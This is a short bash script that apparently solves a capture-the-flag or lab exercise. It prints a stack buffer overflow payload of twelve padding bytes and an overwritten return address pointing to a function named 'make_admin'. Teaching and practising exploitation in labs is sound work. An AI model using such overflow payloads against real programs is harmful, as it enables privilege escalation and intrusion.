#!bin/bash

buffer=$(printf '\x41%.0s' {1..12}) #fill the buffer
ret_addr="\x80\x85\x04\x08"     #address to make_admin 0x08048580

echo -en "$buffer$ret_addr"